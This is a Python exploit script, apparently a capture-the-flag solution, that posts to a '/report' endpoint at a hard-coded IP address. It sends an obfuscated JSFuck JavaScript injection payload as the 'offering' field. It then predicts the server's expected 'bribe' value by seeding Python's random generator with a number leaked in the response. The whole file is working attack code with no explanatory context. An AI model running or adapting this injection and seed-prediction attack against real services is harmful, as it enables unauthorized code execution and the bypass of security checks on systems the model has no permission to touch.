#!/usr/bin/python

import requests
import random


def toUnsignedInt(num_bits):
	return f"{num_bits & 0xffff_ffff:032b}"


def extractNumFromResult(cont):
	return int(cont[cont.find(b"was")+len(b"was")+1:len(cont)].strip())

def postToURL(bribe):
	headers = {'User-Agent': 'Mozilla/5.0'}
	#payload = {'offering':'([][(![]+[])[+[]]+([][[]]+[])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]))[+!+[]+[+[]]]','bribe':bribe}
	payload = {'offering':'([][([][[]]+[])[+!+[]]+([][[]]+[])[+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[])[+!+[]]+([]+[])[+[]]+([]+[])[+!+[]]+([]+[])[+!+[]+!+[]+!+[]]])[([][[]]+[])[+!+[]]+([]+[])[+!+[]+!+[]+!+[]]+([]+[])[+[]]+([]+[])[+!+[]]+([]+[])[+!+[]+!+[]]+([]+[])[+[]]+([]+[])[+!+[]+!+[]+!+[]+!+[]]+([]+[])[+!+[]+!+[]]]([([]+[])[([][[]]+[])[+!+[]]+([][[]]+[])[+[]]+([]+[])[+!+[]]+([]+[])[+!+[]+!+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[+[]]+([]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]+!+[]]]())','bribe':bribe}
	print(payload)
	result = session.post('http://150.136.137.215/report',headers=headers,data=payload,verify=False)
	print(result.content)
	#print(result.cookies.get_dict())
	return result


if __name__ == "__main__":

	session = requests.Session()

	intial = postToURL(0)
	failResult = extractNumFromResult(intial.content)
	print("Seeding " + str(failResult))
	random.seed(failResult) #Seed result
	#res = postToURL(failResult)
	prediction = random.randint(-1234567, 7654321)
	print("Prediction: "  + str(prediction))
	postToURL(prediction)
	#print(session.cookies)







